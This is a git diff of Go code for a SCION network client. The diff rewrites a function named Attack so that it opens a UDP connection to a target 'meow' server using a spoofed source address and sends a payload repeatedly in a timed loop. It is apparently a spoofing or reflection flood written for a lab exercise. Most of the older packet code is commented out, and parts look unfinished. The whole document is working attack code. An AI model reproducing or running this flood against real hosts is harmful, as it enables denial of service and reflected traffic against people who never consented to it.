@@ -19,7 +19,6 @@ import (
 	"github.com/scionproto/scion/go/lib/snet"
 	"github.com/scionproto/scion/go/lib/snet/addrutil"
 	"github.com/scionproto/scion/go/lib/sock/reliable"
-	"github.com/scionproto/scion/go/lib/spath"
 )
 
 // hostContext contains the information needed to connect to the host's local SCION stack,
@@ -68,7 +67,7 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	// SCION daemon
 	sciondAddr := SCIONDAddress()
 
-	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
+	_, err = daemon.NewService(sciondAddr).Connect(ctx)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -84,10 +83,14 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	}
 
 	scionNetwork := snet.NewNetwork(meowSCIONAddr.IA, dispatcher, nil)
-	scionNetwork.Dial(ctx, "udp", &net.UDPAddr{}, meowSCIONAddr, addr.SvcNone)
+	conn, err := scionNetwork.Dial(ctx, "udp", spoofedAddr.Host, meowSCIONAddr, addr.SvcNone)
 
-	localIA, err := sciondConn.LocalIA(ctx)
-	hostInLocalAS, err := findAnyHostInLocalAS(ctx, sciondConn)
+	if err != nil {
+		log.Fatal("Error dialing scion network", err)
+	}
+
+	//localIA, err := sciondConn.LocalIA(ctx)
+	/*hostInLocalAS, err := findAnyHostInLocalAS(ctx, sciondConn)
 	if err != nil {
 		log.Fatal("Error finding local host", err)
 	}
@@ -104,9 +107,11 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	if err != nil {
 		log.Fatal("Error registering with dispatcher", err)
 	}
-	conn := snet.NewSCIONPacketConn(rconn, nil, true)
+	conn := snet.NewSCIONPacketConn(rconn, nil, true)*/
 
-	fmt.Println("meow addr, nexthop", meowSCIONAddr.Host, meowSCIONAddr.NextHop)
+	n_bytes, err := conn.Write(payload)
+
+	/*fmt.Println("meow addr, nexthop", meowSCIONAddr.Host, meowSCIONAddr.NextHop)
 	writeBuffer := make([]byte, server.MaxBufferSize)
 	pkt := &snet.Packet{
 		Bytes: writeBuffer,
@@ -128,43 +133,43 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 		},
 	}
 	fmt.Println("pkt info is ", pkt.PacketInfo)
-	err = conn.WriteTo(pkt, meowSCIONAddr.NextHop)
+	err = conn.WriteTo(pkt, meowSCIONAddr.NextHop)*/
 	if err != nil {
 		log.Fatal("Write failed", err)
 	}
 
-	fmt.Println("Write success")
+	fmt.Println("Write success, bytes written", n_bytes)
 
-	readBuffer := make([]byte, server.MaxBufferSize)
+	/*readBuffer := make([]byte, server.MaxBufferSize)
 	deadline := time.Now().Add(time.Second * 3)
 	err = conn.SetReadDeadline(deadline)
 	if err != nil {
 		fmt.Println("CLIENT: SetReadDeadline produced an error.", err)
 		return
-	}
+	}*/
 
-	pkt1 := snet.Packet{
+	/*pkt1 := snet.Packet{
 		Bytes: readBuffer,
 	}
 	var lastHop net.UDPAddr
-	err = conn.ReadFrom(&pkt1, &lastHop)
+	err = conn.ReadFrom(&pkt1, &lastHop)*/
+
+	/*n_bytes, err = conn.Read(readBuffer)
 	if err != nil {
 		fmt.Println("CLIENT: Error reading from connection.", err)
 		return
 	}
-	udp, ok := pkt1.Payload.(snet.UDPPayload)
-	fmt.Println(udp.Payload, ok)
+	fmt.Println("Read success", n_bytes)*/
 
-	/*fmt.Printf("CLIENT: Packet-received: bytes=%d from=%s\n",
-		nRead, conn.RemoteAddr())
-	var answer string
-	json.Unmarshal(readBuffer[:nRead], &answer)
-	fmt.Printf("CLIENT:The answer was: \n%s", answer)*/
-	// attackDuration := AttackDuration()
-	// for start := time.Now(); time.Since(start) < attackDuration; {
-	// 	// make request to meow with spoofed addr
-
-	// }
+	attackDuration := AttackDuration()
+	for start := time.Now(); time.Since(start) < attackDuration; {
+		// make request to meow with spoofed addr
+		n_bytes, err := conn.Write(payload)
+		if err != nil {
+			log.Fatal("Write failed", err)
+		}
+		fmt.Println("Write success, bytes written", n_bytes)
+	}
 	return nil
 }
 
